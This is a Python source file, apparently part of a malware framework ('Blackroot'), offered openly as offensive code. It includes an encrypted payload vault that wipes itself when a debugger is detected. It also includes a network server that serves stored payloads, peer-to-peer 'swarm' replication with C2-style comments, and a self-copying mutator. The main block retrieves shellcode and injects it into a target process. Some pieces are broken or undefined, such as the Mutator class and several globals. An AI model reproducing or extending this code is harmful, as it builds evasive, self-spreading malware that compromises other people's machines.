# Import necessary standard libraries
import os  # For interacting with the operating system (e.g., file paths, environment variables)
import json  # To work with JSON data for metadata
import hashlib  # For generating cryptographic hashes (SHA256)
import base64  # For encoding binary data (not used in the final version but often useful)
import time  # For timestamping and checking expiry
from datetime import datetime, timedelta  # For handling expiry times
import random

# Import third-party cryptography library (PyCryptodome)
from Crypto.Cipher import AES  # Advanced Encryption Standard cipher
from Crypto.Random import get_random_bytes  # For generating secure random data (like IVs)
from Crypto.Util.Padding import pad, unpad  # To handle padding for block ciphers
from ghost_layer import GhostLayer;

# Import standard library for keyed-hash message authentication
import hmac

# === Global Configuration ===
# Define the directory where vault files will be stored, using the user's home directory
VAULT_DIR = os.path.expanduser("~/.blackvault")
# Define the block size for the AES cipher (128 bits)
AES_BLOCK_SIZE = 16

class BlackVault:
    """A secure, encrypted, and authenticated local storage system (vault)."""
    
    def __init__(self, password: str = None, rotate_days: int = 7):
        """
        Initializes the vault.
        - Creates the vault directory if it doesn't exist.
        - Derives encryption and HMAC keys from a password or a default key.
        - Sets up key rotation policy.
        """
        # Create the vault directory on the filesystem if it's not already there
        if not os.path.exists(VAULT_DIR):
            os.makedirs(VAULT_DIR)
            
        # Derive the main key material from the provided password or a hardcoded default
        if password:
            key_material = hashlib.sha256(password.encode()).digest()
        else:
            # Use a default key if no password is provided
            key_material = hashlib.sha256(b"blackvault-core-key").digest()
            
        # Set the encryption key and derive a separate key for HMAC to prevent conflicts
        self.key = key_material
        self.hmac_key = hashlib.sha256(key_material + b"-hmac").digest()
        
        # Set the number of days after which the encryption key should be rotated
        self.rotate_days = rotate_days
        # Check if it's time to rotate the key and re-encrypt artifacts
        self._check_key_rotation()

    def _vault_path(self, name: str) -> str:
        """Generates a hashed, anonymized file path for a stored artifact."""
        # Hash the artifact name to avoid storing sensitive names in plain text on the filesystem
        hashed = hashlib.sha256(name.encode()).hexdigest()
        return os.path.join(VAULT_DIR, f"{hashed}.dat")

    def _encrypt(self, data: bytes, expire_minutes: int = None) -> bytes:
        """Encrypts and signs data using AES-256-CBC and HMAC-SHA256."""
        # Generate a random Initialization Vector (IV) for each encryption to ensure uniqueness
        iv = get_random_bytes(16)
        # Create an AES cipher object in CBC mode
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        
        # Handle optional expiration for the artifact
        if expire_minutes:
            # Calculate the expiry timestamp
            expiry_time = int((datetime.utcnow() + timedelta(minutes=expire_minutes)).timestamp())
            # Prepend the 8-byte timestamp to the data
            data = expiry_time.to_bytes(8, 'big') + data
        else:
            # If no expiration, prepend 8 null bytes as a placeholder
            data = b'\x00' * 8 + data
            
        # Encrypt the data after padding it to the AES block size
        ct = cipher.encrypt(pad(data, AES_BLOCK_SIZE))
        # Create an HMAC digest (a signature) of the IV and ciphertext to ensure integrity and authenticity
        hmac_digest = hmac.new(self.hmac_key, iv + ct, hashlib.sha256).digest()
        
        # Return the final encrypted payload: IV + ciphertext + HMAC
        return iv + ct + hmac_digest

    def _decrypt(self, encrypted: bytes) -> bytes:
        """Verifies, decrypts, and unpads data, checking for expiration."""
        # Extract the IV (first 16 bytes), ciphertext, and HMAC (last 32 bytes)
        iv = encrypted[:16]
        ct = encrypted[16:-32]
        hmac_received = encrypted[-32:]
        
        # Calculate the HMAC of the received IV and ciphertext to verify integrity
        hmac_calculated = hmac.new(self.hmac_key, iv + ct, hashlib.sha256).digest()
        
        # Securely compare the received HMAC with the calculated one. If they don't match, the data is corrupt or tampered with.
        if not hmac.compare_digest(hmac_received, hmac_calculated):
            raise ValueError("HMAC integrity check failed!")
            
        # Create an AES cipher to decrypt the data
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        # Decrypt the ciphertext and remove the padding
        data = unpad(cipher.decrypt(ct), AES_BLOCK_SIZE)
        
        # Extract the expiry timestamp from the first 8 bytes
        expiry_timestamp = int.from_bytes(data[:8], 'big')
        
        # Check if the artifact has expired
        if expiry_timestamp != 0 and time.time() > expiry_timestamp:
            raise ValueError("Artifact has expired")
            
        # Return the original plaintext data
        return data[8:]

    def store(self, name: str, data: bytes, expire_minutes: int = None):
        """Encrypts and stores an artifact in the vault."""
        encrypted = self._encrypt(data, expire_minutes)
        with open(self._vault_path(name), "wb") as f:
            f.write(encrypted)
        print(f"[🔒] Stored encrypted artifact: {name}")

    def retrieve(self, name: str) -> bytes:
        """Retrieves and decrypts an artifact from the vault."""
        with open(self._vault_path(name), "rb") as f:
            encrypted = f.read()
        return self._decrypt(encrypted)

    def retrieve_for_ghostlayer(self, name: str) -> bytes:
        """A specific retriever function for a 'GhostLayer' module, adding a log message."""
        print(f"[🔑] GhostLayer fetching payload from BlackVault: {name}")
        return self.retrieve(name)

    def list_artifacts(self):
        """Lists all (hashed) artifact files in the vault directory."""
        return os.listdir(VAULT_DIR)

    def delete(self, name: str):
        """Deletes an artifact from the vault."""
        path = self._vault_path(name)
        if os.path.exists(path):
            os.remove(path)
            print(f"[🗑️] Deleted artifact: {name}")

    def auto_wipe_if_debugger(self):
        """An anti-debugging technique to wipe the vault if a debugger is detected."""
        try:
            # For Windows, use the ctypes library to call the IsDebuggerPresent kernel function
            if os.name == "nt":
                import ctypes
                if ctypes.windll.kernel32.IsDebuggerPresent():
                    self.wipe_all()
            # For other systems (like Linux), check for a specific environment variable as a simple trigger
            else:
                if os.getenv("DEBUG") == "1":
                    self.wipe_all()
        except:
            # Fail silently if checks can't be performed
            pass

    def _check_key_rotation(self):
        """
        Checks if the encryption key is old and needs to be rotated.
        If so, it generates a new key and re-encrypts all existing artifacts.
        """
        key_meta_path = os.path.join(VAULT_DIR, "vault.keymeta")
        now = int(time.time())
        
        if os.path.exists(key_meta_path):
            with open(key_meta_path, 'r') as f:
                meta = json.load(f)
                last_rotated = meta.get("last_rotated", 0)
                
                # Check if enough days have passed to trigger rotation
                if now - last_rotated >= self.rotate_days * 86400:
                    print("[🔁] Rotating BlackVault encryption key and re-encrypting artifacts...")
                    # Generate a new random key and derive encryption/HMAC keys
                    new_key = get_random_bytes(32)
                    self.key = hashlib.sha256(new_key).digest()
                    self.hmac_key = hashlib.sha256(self.key + b"-hmac").digest()
                    
                    # Update the rotation timestamp in the metadata file
                    with open(key_meta_path, 'w') as fw:
                        json.dump({"last_rotated": now}, fw)
                        
                    # Loop through all artifacts, decrypt with the old key, and re-encrypt with the new key
                    for f in os.listdir(VAULT_DIR):
                        if f.endswith(".dat"):
                            path = os.path.join(VAULT_DIR, f)
                            try:
                                # Decrypt with the (old) key currently in memory
                                with open(path, 'rb') as af:
                                    original_data = self._decrypt(af.read())
                                # Re-encrypt with the new key and overwrite the file
                                with open(path, 'wb') as af:
                                    af.write(self._encrypt(original_data))
                            except Exception as e:
                                print(f"[!] Could not re-encrypt {f}: {e}")
        else:
            # If metadata file doesn't exist, create it with the current time
            with open(key_meta_path, 'w') as f:
                json.dump({"last_rotated": now}, f)

    def wipe_all(self):
        """Deletes all files in the vault directory."""
        for f in os.listdir(VAULT_DIR):
            try:
                os.remove(os.path.join(VAULT_DIR, f))
            except:
                continue # Ignore errors and continue
        print("[💣] Vault auto-wiped due to trigger condition.")


# === Linkage to Blackroot Runtime + Vault Replication ===
import threading # For running the server in a non-blocking way
import socket    # For network communication

class VaultSyncServer:
    """A server to allow remote authenticated clients to fetch artifacts from the vault."""
    def __init__(self, host='0.0.0.0', port=8484, vault=None, auth_token="blackvault-shared-key"):
        self.host = host
        self.port = port
        self.vault = vault
        self.auth_token = hashlib.sha256(auth_token.encode()).digest()

    def handle_client(self, conn):
        """Handles a single client connection."""
        try:
            # First, require the client to send a 32-byte authentication token
            auth = conn.recv(32)
            if not hmac.compare_digest(auth, self.auth_token):
                conn.sendall(b"ERRunauthorized")
                conn.close()
                return

            # Receive the artifact name and retrieve it from the vault
            name_len = int.from_bytes(conn.recv(2), 'big')
            name = conn.recv(name_len).decode()
            artifact = self.vault.retrieve(name)
            
            # Send the artifact back to the client, prefixed with its length
            conn.sendall(len(artifact).to_bytes(4, 'big') + artifact)
        except Exception as e:
            # Send an error message if anything goes wrong
            conn.sendall(b"ERR" + str(e).encode())
        finally:
            conn.close()

    def run(self):
        """Runs the server, listening for incoming connections."""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((self.host, self.port))
            s.listen()
            print(f"[🌐] VaultSync server running on {self.host}:{self.port}")
            while True:
                conn, _ = s.accept()
                # Start a new thread for each client to handle multiple connections simultaneously
                threading.Thread(target=self.handle_client, args=(conn,), daemon=True).start()

class VaultSyncClient:
    """A client to fetch artifacts from a remote VaultSyncServer."""
    def __init__(self, host, port=8484, auth_token="blackvault-shared-key"):
        self.host = host
        self.port = port
        self.auth_token = hashlib.sha256(auth_token.encode()).digest()

    def fetch(self, name):
        """Connects to the server and fetches a named artifact."""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((self.host, self.port))
            # Send the auth token, artifact name, and receive the data
            s.sendall(self.auth_token)
            s.sendall(len(name).to_bytes(2, 'big') + name.encode())
            length = int.from_bytes(s.recv(4), 'big')
            data = s.recv(length)
            return data

# === End VaultSync Extension ===

# Automatically register this BlackVault module with the global BLACKROOT runtime environment
try:
    import core 
    core.register_module("blackvault", BlackVault)
    print("[🔗] BlackVault linked to Blackroot runtime.")
except ImportError:
    # Run in standalone mode if the parent framework is not found
    print("[⚠️] Blackroot core runtime not found. Standalone mode engaged.")


# === Adaptive Registration with Swarm ===
class SwarmIdentity:
    """Manages the identity of a single replica in the swarm."""
    def __init__(self, replica_id, environment):
        self.replica_id = replica_id
        self.environment = environment

    def register(self):
        """Announces the replica's presence."""
        print(f"[🤖] Replica {self.replica_id} registering in environment: {self.environment}")
        # In a real scenario, this would broadcast its ID to a C2 or peer list.

    def adapt_behavior(self):
        """Changes behavior based on the detected operating system."""
        if 'windows' in self.environment.lower():
            print("[🔄] Adapting behavior: Windows shellcode stealth active.")
        elif 'linux' in self.environment.lower():
            print("[🔄] Adapting behavior: Linux ELF injection enabled.")
        else:
            print("[🔄] Default fallback behavior engaged.")

# === Swarm P2P Capability Exchange ===
class SwarmExchange:
    """Manages P2P communication for exchanging capabilities between swarm members."""
    def __init__(self, peer_ports=[8585, 8686]):
        self.peer_ports = peer_ports
        # This is injected later to avoid circular dependency
        self.evolution = None 

    def broadcast_capabilities(self, replica_id, capabilities):
        """Sends this replica's capabilities to a list of known peer ports."""
        for port in self.peer_ports:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect(('127.0.0.1', port))
                    payload = json.dumps({"replica": replica_id, "capabilities": capabilities}).encode()
                    s.sendall(len(payload).to_bytes(2, 'big') + payload)
            except:
                # Silently ignore connection errors to peers that may be offline
                continue

    def listen_for_exchange(self, port=8585):
        """Starts a listener thread to receive capability broadcasts from other peers."""
        def handler():
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind(('0.0.0.0', port))
                s.listen()
                print(f"[🌐] SwarmExchange listening on port {port}")
                while True:
                    conn, _ = s.accept()
                    threading.Thread(target=self._handle_peer, args=(conn,), daemon=True).start()
        threading.Thread(target=handler, daemon=True).start()

    def _handle_peer(self, conn):
        """Handles an incoming peer connection, parsing their capabilities."""
        try:
            size = int.from_bytes(conn.recv(2), 'big')
            data = json.loads(conn.recv(size).decode())
            print(f"[🧠] Capability received from {data['replica']}: {data['capabilities']}")
            # Pass the received data to the SwarmEvolution module to update the swarm state
            if self.evolution:
                self.evolution.update_composition(data['replica'], data['capabilities'])
        except:
            pass
        finally:
            conn.close()

# === Swarm Evolution Based on Composition ===
class SwarmEvolution:
    """Makes decisions to adapt the local replica's role based on the overall swarm composition."""
    def __init__(self, known_replicas=None):
        self.known_replicas = known_replicas or {}

    def update_composition(self, replica_id, capabilities):
        """Updates the internal list of known replicas and their capabilities."""
        self.known_replicas[replica_id] = capabilities
        print(f"[🧬] Swarm composition updated: {len(self.known_replicas)} members")
        self.adapt_local_modules()

    def adapt_local_modules(self):
        """Analyzes the swarm's capabilities and adapts the local replica's roles."""
        module_counts = {}
        for caps in self.known_replicas.values():
            for cap in caps:
                module_counts[cap] = module_counts.get(cap, 0) + 1

        # Example rule: If many 'ghostlayer' modules are present, activate advanced stealth
        if module_counts.get("ghostlayer", 0) > 3:
            print("[🌪️] Swarm consensus: activating stealth upgrades")
        
        # Example rule: If there are too few 'vault' nodes, become one. If too many, stop being one.
        if module_counts.get("vault", 0) < 2:
            print("[⚠️] Swarm imbalance: promoting self to Vault node")
            self.promote_to_capability("vault")
        elif module_counts.get("vault", 0) > 4:
            print("[📉] Swarm overreplicated: demoting self from Vault role")
            self.demote_capability("vault")

    def promote_to_capability(self, capability):
        """Adds a capability to the local replica and broadcasts the change."""
        if capability not in capabilities: # Accessing global 'capabilities' list
            capabilities.append(capability)
            print(f"[📦] Self-promoted to: {capability}")
            swarm.broadcast_capabilities(identity.replica_id, capabilities)

    def demote_capability(self, capability):
        """Removes a capability from the local replica and broadcasts the change."""
        if capability in capabilities: # Accessing global 'capabilities' list
            capabilities.remove(capability)
            print(f"[📤] Self-demoted from: {capability}")
            swarm.broadcast_capabilities(identity.replica_id, capabilities)


# === Main Execution and Initialization ===

# Initialize the swarm communication and evolution components
swarm = SwarmExchange()
evolution_engine = SwarmEvolution()
swarm.evolution = evolution_engine # Inject the evolution engine into the exchange listener
swarm.listen_for_exchange()

# Create a mutated version of this script
mutator = Mutator(__file__)
replica_name = f"replica_{random.randint(1000, 9999)}.py"
mutator.mutate_and_replicate(replica_name)

# Set up the identity and initial capabilities for this replica
identity = SwarmIdentity(replica_id=replica_name, environment=os.name)
identity.register()
identity.adapt_behavior()
capabilities = ["vault", "ghostlayer", "mutator"] # This replica's starting roles
swarm.broadcast_capabilities(identity.replica_id, capabilities)


# Example Usage with GhostLayer
if __name__ == "__main__":
    # Initialize the vault with a password
    vault = BlackVault(password="my-secret-pass")
    # Activate the anti-debugging check
    vault.auto_wipe_if_debugger()

    # Store a payload if it doesn't already exist
    if not os.path.exists(vault._vault_path("ghost_payload")):
        vault.store("ghost_payload", b"Stealth shellcode blob", expire_minutes=10)

    # Attempt to use the 'GhostLayer' module for process injection
    try:
          # Assuming ghostlayer_core.py exists
        ghost = GhostLayer()
        # Retrieve the payload from the secure vault
        ghost.shellcode = vault.retrieve_for_ghostlayer("ghost_payload")
        # Find a target process to inject into
        pid = ghost.find_target_process()
        # Encrypt the shellcode before injection
        encrypted = ghost.encrypt_shellcode()
        # Perform the injection
        ghost.inject_into_pid(pid, encrypted)
    except Exception as e:
        # Catch errors if GhostLayer fails (e.g., module not found, injection blocked)
        print(f"[⚠️] GhostLayer operation failed: {str(e)}")